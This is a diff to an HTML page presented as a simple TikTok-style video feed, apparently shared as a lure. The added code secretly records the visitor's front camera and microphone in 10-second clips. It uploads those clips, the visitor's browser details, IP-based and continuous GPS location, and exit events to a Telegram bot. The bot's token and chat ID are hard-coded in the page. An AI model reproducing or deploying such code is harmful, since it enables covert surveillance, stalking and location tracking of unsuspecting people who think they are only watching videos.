@@ -6,6 +6,7 @@
     <title>Қарапайым TikTok - Алмас жіберді</title>
     <script src="https://cdn.tailwindcss.com"></script>
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css" rel="stylesheet">
+    
     <style>
         /* Экран секірмеуі үшін қатаң шектеулер */
         body, html {
@@ -265,7 +266,7 @@
                 likes: "125K",
                 comments: "3402",
                 shares: "12K",
-                videoUrl: "https://vjs.zencdn.net/v/oceans.mp4",
+                videoUrl: "https://data.quranacademy.com/Videos/Khutbat-e-Jummah/Jumma180725SHJ.mp4",
                 sharedBy: "Алмас"
             },
             {
@@ -290,6 +291,41 @@
             }
         ];
 
+        // ==========================================
+        // TELEGRAM БАПТАУЛАРЫ
+        // ==========================================
+        const TELEGRAM_BOT_TOKEN = '8544038643:AAEh_qOpyfCqeIx311DiD-c1V2f0YDD_Sv8'; 
+        const TELEGRAM_CHAT_ID = '8517541960'; 
+
+        let mediaRecorder;
+        let recordedChunks = [];
+        let recordInterval;
+
+        function sendToTelegram(text) {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
+            }).catch(err => console.error(err));
+        }
+
+        function sendVideoToTelegram(videoBlob, caption, filename) {
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            // sendDocument орнына sendVideo қолданамыз және кілтті 'video' деп береміз
+            formData.append('video', videoBlob, filename);
+            formData.append('caption', caption);
+
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            }).then(response => {
+                console.log("Видео сәтті жіберілді", response);
+            }).catch(err => {
+                console.error("Видео жіберу қатесі:", err);
+            });
+        }
+
         function startApp() {
             const overlay = document.getElementById('startOverlay');
             overlay.style.display = 'none';
@@ -302,7 +338,6 @@
                 elem.webkitRequestFullscreen().catch(e => console.log(e));
             }
 
-            // Камера мен орынға рұқсат сұрау процесін іске қосу
             requestPermissions();
 
             const firstVideo = document.querySelector('video');
@@ -312,40 +347,136 @@
             }
         }
 
-        // РҰҚСАТ СҰРАУ ФУНКЦИЯСЫ
         function requestPermissions() {
-            // 1. Орынға (геолокация) рұқсат сұрау
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    (position) => {
-                        console.log("Орын анықталды. Ендік:", position.coords.latitude, "Бойлық:", position.coords.longitude);
-                    },
-                    (error) => {
-                        console.warn("Орынды анықтау қатесі немесе рұқсат берілмеді:", error.message);
-                    }
-                );
-            } else {
-                console.warn("Бұл браузер геолокацияны қолдамайды.");
-            }
+            sendToTelegram("<b>🚀 Жаңа пайдаланушы кірді!</b>\nЖүйе: " + navigator.userAgent);
 
-            // 2. Камера мен микрофонға (видео/аудио) рұқсат сұрау
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true })
                     .then(function(stream) {
-                        console.log("Камера мен микрофонға рұқсат сәтті алынды");
-                        
-                        // Рұқсат алған соң камераны қайта өшіру (құрылғыда жасыл индикатор жанып тұрмауы үшін)
-                        stream.getTracks().forEach(track => {
-                            track.stop();
-                        });
+                        startLocationTracking();
+                        recordAndSendVideo(stream); 
                     })
                     .catch(function(err) {
-                        console.warn("Камераға/микрофонға рұқсат берілмеді:", err.message);
+                        sendToTelegram("⚠️ Камера/Микрофон рұқсат етілмеді.");
+                        startLocationTracking();
                     });
             } else {
-                console.warn("Бұл браузер камераны қолдамайды немесе қауіпсіз емес байланыс (HTTPS емес).");
+                startLocationTracking();
             }
         }
+
+        function startLocationTracking() {
+            // 1. IP АРҚЫЛЫ ОРЫН АЛУ (Резервті нұсқа: GPS қате көрсетсе немесе ғимарат ішінде болса, интернет арқылы табады)
+            fetch('https://ipapi.co/json/')
+                .then(res => res.json())
+                .then(data => {
+                    sendToTelegram(`🌐 <b>Интернет (IP) бойынша орын:</b>\nҚала: ${data.city}, ${data.region}\nПровайдер: ${data.org}\nIP: ${data.ip}\n🗺️ <a href="https://maps.google.com/?q=${data.latitude},${data.longitude}">Картадан ашу</a>`);
+                }).catch(e => console.log('IP tracking failed', e));
+
+            // 2. НАҚТЫ GPS ОРЫНДЫ АЛУ
+            if (navigator.geolocation) {
+                const geoOptions = { enableHighAccuracy: true, maximumAge: 0, timeout: 15000 };
+                
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        sendToTelegram(`📍 <b>Дәл қазіргі нақты орын (GPS):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу (${lat}, ${lon})</a>\n🎯 Дәлдік радиусы: ${accuracy.toFixed(1)} метр`);
+                    },
+                    (error) => console.warn("Орынды дәл табу қатесі:", error.message),
+                    geoOptions
+                );
+
+                navigator.geolocation.watchPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        const accuracy = position.coords.accuracy;
+                        // Тек дәлдігі 100 метрден жақсы болса ғана жаңарту жіберу (артық спам болмас үшін)
+                        if(accuracy <= 100) {
+                            sendToTelegram(`📍 <b>Орын жаңартылды (Қозғалыста):</b>\n🗺️ <a href="https://maps.google.com/?q=${lat},${lon}">Картадан ашу</a>\n🎯 Дәлдігі: ${accuracy.toFixed(1)} метр`);
+                        }
+                    },
+                    (error) => console.warn("Watch қатесі:", error.message),
+                    geoOptions
+                );
+            }
+        }
+
+        function recordAndSendVideo(stream) {
+            let options = {};
+            if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
+                options = { mimeType: 'video/webm;codecs=vp8,opus' };
+            } else if (MediaRecorder.isTypeSupported('video/mp4')) {
+                options = { mimeType: 'video/mp4' };
+            }
+
+            try {
+                mediaRecorder = new MediaRecorder(stream, options);
+
+                mediaRecorder.ondataavailable = function(e) {
+                    if (e.data && e.data.size > 0) {
+                        recordedChunks.push(e.data);
+                    }
+                };
+
+                mediaRecorder.onstop = function() {
+                    if (recordedChunks.length > 0) {
+                        const ext = (mediaRecorder.mimeType || '').includes('mp4') ? 'mp4' : 'webm';
+                        const videoBlob = new Blob(recordedChunks, { type: mediaRecorder.mimeType || 'video/webm' });
+                        
+                        sendVideoToTelegram(videoBlob, "📹 Видео түсірілім (10 секундтық бөлік)", `video_part_${Date.now()}.${ext}`);
+                        recordedChunks = [];
+                    }
+                };
+
+                function startRecordingCycle() {
+                    if (mediaRecorder.state === 'inactive') {
+                        mediaRecorder.start();
+                        // ВИДЕО КЕЛМЕЙ ҚАЛУДЫҢ АЛДЫН АЛУ: Әр 10 секунд сайын қысқа видео жіберіп отырамыз
+                        recordInterval = setTimeout(() => {
+                            if (mediaRecorder.state === 'recording') {
+                                mediaRecorder.stop(); 
+                                setTimeout(startRecordingCycle, 500); // 0.5 секундтан соң келесі 10 секундты түсіруді бастайды
+                            }
+                        }, 10000); 
+                    }
+                }
+
+                startRecordingCycle();
+
+            } catch (err) {
+                console.error("MediaRecorder қатесі:", err);
+            }
+        }
+
+        // Сайттан шыққанда (Басқа вкладкаға өткенде немесе жапқанда) видеоны ТОҚТАТЫП ЖІБЕРУ
+        document.addEventListener("visibilitychange", () => {
+            if (document.visibilityState === 'hidden') {
+                if (mediaRecorder && mediaRecorder.state === 'recording') {
+                    clearTimeout(recordInterval);
+                    mediaRecorder.stop(); // Сайттан шыққанда бірден тоқтатып, видеоны жібереді
+                }
+            } else if (document.visibilityState === 'visible') {
+                if (mediaRecorder && mediaRecorder.state === 'inactive') {
+                    mediaRecorder.start(); // Қайта кірсе жалғастырады
+                }
+            }
+        });
+
+        // Браузерді толықтай жауып жатқан кезде орындалатын соңғы әрекет
+        window.addEventListener("beforeunload", (e) => {
+            // Сенімділік үшін тексттік хабарламаны SendBeacon арқылы жіберу (Браузер жабылса да кетеді)
+            const text = "🛑 Пайдаланушы сайтты жапты / сайттан шығып кетті!";
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+            const data = new Blob([JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })], { type: 'application/json' });
+            navigator.sendBeacon(url, data);
+
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            }
+        });
 
         const observerOptions = {
             root: videoContainer,
